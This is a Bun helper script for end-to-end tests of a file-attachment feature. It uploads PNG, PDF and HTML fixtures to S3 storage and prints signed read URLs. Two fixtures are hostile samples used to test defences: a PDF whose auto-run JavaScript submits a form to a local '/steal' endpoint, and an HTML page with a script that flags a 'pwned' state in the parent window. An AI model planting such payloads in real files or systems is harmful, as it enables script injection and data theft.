import { objectKeyFor } from '@rpg/attachments';
import { BunS3ObjectStorage, s3ConfigFromEnv } from '@rpg/attachments/s3';

/**
 * Bun helper for `attachments.e2e.ts` (Playwright runs under Node, `Bun.S3Client` does not).
 * `upload` stores fixture objects in the real provider through the production adapter and prints
 * the signed read URLs the route-mocked API hands the page; `delete <key...>` removes them.
 */

const CAMPAIGN = '00000000-0000-4000-8000-0000000000a1';
const storage = new BunS3ObjectStorage(s3ConfigFromEnv(process.env));

// 2×2 opaque PNG.
const PNG = Uint8Array.from(
  atob(
    'iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFklEQVR4nGP4z8DwHwwZGP7//w9kAABHygj4/BTyWgAAAABJRU5ErkJggg==',
  ),
  (character) => character.charCodeAt(0),
);
const PDF = new TextEncoder().encode(
  [
    '%PDF-1.4',
    '1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj',
    '2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj',
    '3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >> endobj',
    "4 0 obj << /S /JavaScript /JS (app.alert('pdf-script'); this.submitForm('http://127.0.0.1:4173/steal')) >> endobj",
    'trailer << /Root 1 0 R >>',
    '%%EOF',
  ].join('\n'),
);
const HOSTILE = new TextEncoder().encode(
  '<html><body><script>window.parent.__attachmentPwned = true; alert("pwned")</script></body></html>',
);

async function put(bytes: Uint8Array, contentType: string): Promise<string> {
  const key = objectKeyFor(CAMPAIGN, crypto.randomUUID());
  const grant = await storage.createUploadGrant({
    key,
    contentType: 'image/png',
    size: bytes.byteLength,
    checksum: new Bun.CryptoHasher('sha256').update(bytes).digest('hex'),
    expiresInSeconds: 600,
  });
  // The hostile object is stored as text/html on purpose: the read grant must still force a type.
  const response = await fetch(grant.url, {
    method: 'PUT',
    headers: { 'content-type': contentType },
    body: bytes,
  });
  if (!response.ok) throw new Error(`upload failed: ${response.status}`);
  return key;
}

async function read(
  key: string,
  contentType: 'image/png' | 'application/pdf',
  seconds = 300,
  disposition: 'inline' | 'attachment' = 'inline',
) {
  return (
    await storage.createReadGrant({
      key,
      contentType,
      disposition,
      ...(disposition === 'attachment' ? { filename: 'letter.pdf' } : {}),
      expiresInSeconds: seconds,
    })
  ).url;
}

const [command, ...rest] = process.argv.slice(2);
if (command === 'upload') {
  const png = await put(PNG, 'image/png');
  const pdf = await put(PDF, 'application/pdf');
  const hostile = await put(HOSTILE, 'text/html');
  console.log(
    JSON.stringify({
      keys: [png, pdf, hostile],
      png: await read(png, 'image/png'),
      pdf: await read(pdf, 'application/pdf'),
      pdfDownload: await read(pdf, 'application/pdf', 300, 'attachment'),
      hostile: await read(hostile, 'image/png'),
      expiring: await read(png, 'image/png', 2),
      storageOrigin: new URL(await read(png, 'image/png')).origin,
    }),
  );
} else if (command === 'offline') {
  // Feature 05 task 05: verified objects for campaign pinning (size and SHA-256 per object).
  const large = new Uint8Array(1_536_000);
  large.set(PNG.subarray(0, 8));
  for (let index = 8; index < large.length; index += 1) large[index] = (index * 31) % 251;
  const objects: Record<string, { key: string; url: string; size: number; checksum: string }> = {};
  for (const [name, bytes, mime] of [
    ['png', PNG, 'image/png'],
    ['pdf', PDF, 'application/pdf'],
    ['large', large, 'image/png'],
  ] as const) {
    const key = await put(bytes, mime);
    objects[name] = {
      key,
      url: await read(key, mime),
      size: bytes.byteLength,
      checksum: new Bun.CryptoHasher('sha256').update(bytes).digest('hex'),
    };
  }
  console.log(JSON.stringify(objects));
} else if (command === 'delete') {
  for (const key of rest) await storage.delete(key);
} else {
  throw new Error('usage: attachment-objects.ts upload | offline | delete <key...>');
}
